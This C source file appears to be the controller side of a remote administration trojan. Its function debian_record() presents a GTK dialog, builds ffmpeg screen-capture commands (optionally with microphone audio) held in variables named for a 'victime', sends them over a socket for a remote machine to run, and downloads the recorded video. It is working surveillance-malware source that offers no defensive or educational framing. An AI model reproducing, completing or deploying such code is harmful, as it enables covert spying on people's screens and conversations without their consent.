#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/debian_options.h"
#include "../includes/utils.h"


GtkWidget *main_win;

const gchar *server_ip;
const char *server_port;
int port;

char *resolution_final;


void debian_record()
{
    //const gchar *victime_cmd = "ffmpeg -s 1920x1080 -f x11grab -t 10 -i :0.0 /home/thibault/Bureau/desktop.flv"; // LOW QUALITY
    //const gchar *victime_cmd = "ffmpeg -f x11grab -r 25 -s 1920x1080 -t 10 -i :0.0 -vcodec libx264 -crf 0 -preset ultrafast desktop.mkv"; // GOOD QUALITY

    //const gchar *victime_cmd = "ffmpeg -f x11grab -r 25 -s 1920x1080 -t ";
    const gchar *victime_cmd = "ffmpeg -f x11grab -r 25 -s";

    //const gchar *sound_victime_cmd = "ffmpeg -f alsa -ac 2 -i pulse -f x11grab -r 30 -s 1920x1080 -i :0.0 -acodec pcm_s16le -vcodec libx264 -t ";
    const gchar *sound_victime_cmd = "ffmpeg -f alsa -ac 2 -i default -f x11grab -r 30 -s";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(victime_cmd) + 1;
    size_t len_sound_cmd = strlen(sound_victime_cmd) + 1;
    size_t len_final_cmd = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    GtkWidget *record_dialog = NULL;
    GtkWidget *record_entry = NULL;
    const gchar *time_of_record = NULL;
    float time_of_record_convert = 0;
    size_t len_time_of_rec = 0;

    GtkWidget *record_sound_dialog = NULL;
    int sound_on = 0;

    GtkWidget *warning_dialog = NULL;

    size_t flag_record = 16;
    int err = 0;

    unsigned char buffer[BUFSIZ] = "";

    FILE *desktop_rec = NULL;
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;

    time_of_record = malloc(4 * sizeof(char));
    if(time_of_record == NULL)
    {
        error("malloc() time_of_record", "debian_record()");
        exit(-1);
    }

    do
    {
        record_dialog = gtk_dialog_new_with_buttons("Record", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);

        gtk_widget_set_size_request(record_dialog, 290, 100);

        record_entry = gtk_entry_new();

        gtk_entry_set_text(GTK_ENTRY(record_entry), "Time of record in secondes (min : 10sec)");

        gtk_box_pack_start(GTK_BOX(GTK_DIALOG(record_dialog)->vbox), record_entry, TRUE, FALSE, 0);

        gtk_widget_show_all(GTK_DIALOG(record_dialog)->vbox);

        switch(gtk_dialog_run(GTK_DIALOG(record_dialog)))
        {
            case GTK_RESPONSE_OK:
                time_of_record = gtk_entry_get_text(GTK_ENTRY(record_entry));
                break;

            case GTK_RESPONSE_NONE:
                break;

            default:
                break;
        }

        if(atoi(time_of_record) < 10)
        {
            warning_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_CLOSE, "You must record at least 10 secondes minimum !!!");

            switch(gtk_dialog_run(GTK_DIALOG(warning_dialog)))
            {
                case GTK_RESPONSE_CLOSE:
                    gtk_widget_destroy(warning_dialog);
                    break;

                case GTK_RESPONSE_NONE:
                    break;

                default:
                    break;
            }
        }
    }while(atoi(time_of_record) < 10);


    record_sound_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Do you want to record also the\nsound from the microphone ?");

    gtk_widget_set_size_request(record_sound_dialog, 310, 100);

    gtk_widget_show_all(GTK_DIALOG(record_sound_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(record_sound_dialog)))
    {
        case GTK_RESPONSE_YES:

            sound_on = 1;

            final_victime_cmd = malloc(256 * sizeof(char));
            if(final_victime_cmd == NULL)
            {
                error("malloc() final_victim_cmd", "debian_record()");
                exit(-1);
            }

            final_victime_cmd = strncpy(final_victime_cmd, sound_victime_cmd, len_sound_cmd);
            final_victime_cmd = strcat(final_victime_cmd, resolution_final);
            final_victime_cmd = strcat(final_victime_cmd, " -i :0.0 -acodec pcm_s16le -vcodec libx264 -t ");
            final_victime_cmd = strcat(final_victime_cmd, time_of_record);
            final_victime_cmd = strcat(final_victime_cmd, " ");
            final_victime_cmd = strcat(final_victime_cmd, "snd_desktop.mkv");

            len_final_cmd = strlen(final_victime_cmd) + 1;
            len_time_of_rec = strlen(time_of_record) + 1;
            break;


//ffmpeg -f alsa -ac 2 -i pulse -f x11grab -r 30 -s 1920x1080 -i :0.0 -acodec pcm_s16le -vcodec libx264 -t 10 bureau.flv

        case GTK_RESPONSE_NO:

            sound_on = 0;

            final_victime_cmd = malloc(256 * sizeof(char));
            if(final_victime_cmd == NULL)
            {
                error("malloc() final_victim_cmd", "debian_record()");
                exit(-1);
            }

            final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
            final_victime_cmd = strcat(final_victime_cmd, resolution_final);
            final_victime_cmd = strcat(final_victime_cmd, " -t ");
            final_victime_cmd = strcat(final_victime_cmd, time_of_record);
            final_victime_cmd = strcat(final_victime_cmd, " ");
            final_victime_cmd = strcat(final_victime_cmd, "-i :0.0 -vcodec libx264 -crf 0 -preset ultrafast desktop.mkv");

            len_final_cmd = strlen(final_victime_cmd) + 1;
            len_time_of_rec = strlen(time_of_record) + 1;
            break;
    }

    printf("\n\n%s\n\n", final_victime_cmd);

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "debian_record()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "debian_record()");
        exit(-1);
    }

    printf("\t\tRECORDING REMOTE DESKTOP ...\n");

    if(send(sock, (char*)&flag_record, sizeof(flag_record), 0) == SOCKET_ERROR)
    {
        error("send() flag_record", "debian_record()");
        exit(-1);
    }

    if(flag_record == 16)
    {
        if(send(sock, (char*)&sound_on, sizeof(sound_on), 0) == SOCKET_ERROR)
        {
            error("send() sound_on", "debian_record()");
            exit(-1);
        }

        if(send(sock, (char*)&len_time_of_rec, sizeof(len_time_of_rec), 0) == SOCKET_ERROR)
        {
            error("send() len_time_of_rec", "debian_record()");
            exit(-1);
        }

        if(send(sock, time_of_record, len_time_of_rec, 0) == SOCKET_ERROR)
        {
            error("send() time_of_record", "debian_record()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "debian_record()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "debian_record()");
            exit(-1);
        }

        sscanf(time_of_record,"%f",&time_of_record_convert);

        gtk_widget_destroy(record_dialog);
        gtk_widget_destroy(record_sound_dialog);

        free(final_victime_cmd);

        wait_end_of_record(time_of_record_convert + (time_of_record_convert / 2));

        if(sound_on == 0)
        {
            desktop_rec = fopen("desktop.mkv", "wb");
            if(desktop_rec == NULL)
            {
                error("fopen() desktop.mkv", "debian_record()");
                exit(-1);
            }
        }

        if(sound_on == 1)
        {
            desktop_rec = fopen("snd_desktop.mkv", "wb");
            if(desktop_rec == NULL)
            {
                error("fopen()", "debian_record()");
                exit(-1);
            }

        }

        if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
        {
            error("recv() data_len", "debian_record()");
            exit(-1);
        }

        printf("le fichier video fait : %ld octets\n\n", data_len);

        do
        {
            tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

            fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, desktop_rec);

            totalRcv += tailleBlockRecut;

            //printf("Dowlading : %.2f Mo\n", (double)totalRcv / 1000000);

        }while(totalRcv < data_len);

        printf("Reception du fichier video success !!\n");
    }

    fclose(desktop_rec);

    free(resolution_final);
}
